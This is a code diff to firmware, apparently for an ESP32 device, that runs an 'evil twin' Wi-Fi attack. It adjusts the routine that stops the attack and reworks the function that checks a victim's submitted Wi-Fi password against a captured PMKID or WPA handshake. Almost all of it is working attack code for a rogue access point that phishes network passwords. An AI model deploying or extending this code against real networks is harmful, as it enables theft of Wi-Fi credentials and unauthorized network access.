@@ -85,7 +85,7 @@ void evil_twin_stop_attack(void)
         ESP_LOGE(TAG, "EvilTwin task is not running.");
         return;
     }
-    
+       
     /* Kill task */
     vTaskDelete(evil_twin_task_handle);
     evil_twin_task_handle = NULL;
@@ -96,10 +96,13 @@ void evil_twin_stop_attack(void)
     /* Stop attack engine */
     wifi_attack_engine_stop();
 
+    /* Wait engine stop */
+    vTaskDelay(3000);
+
     /* Restore original hotspot */
     wifi_start_softap();
 
-    /* Wait softap restpre */
+    /* Wait softap restore */
     vTaskDelay(3000);
 
     /* Start Admin server */
@@ -111,13 +114,16 @@ bool evil_twin_check_password(char *password)
 {
     handshake_info_t *handshake = wifi_attack_engine_handshake();
 
-    if( handshake->handshake_captured == false )
+    if( handshake->pmkid_captured == true )
     {
-        return ESP_FAIL;
+        return verify_pmkid(password, (char *)&target.ssid, strlen((char *)&target.ssid), target.bssid, handshake->mac_sta, handshake->pmkid);
+    }
+    else if( handshake->handshake_captured == true )
+    {
+        return verify_password(password, (char *)&target.ssid, strlen((char *)&target.ssid), target.bssid, handshake->mac_sta, handshake->anonce, handshake->snonce, handshake->eapol, handshake->eapol_len, handshake->mic);
     }
     else
     {
-        //return verify_pmkid(password, (char *)&target.ssid, strlen((char *)&target.ssid), target.bssid, handshake->mac_sta, handshake->pmkid);
-        return verify_password(password, (char *)&target.ssid, strlen((char *)&target.ssid), target.bssid, handshake->mac_sta, handshake->anonce, handshake->snonce, handshake->eapol, handshake->eapol_len, handshake->mic);
+        return false;
     }
 }
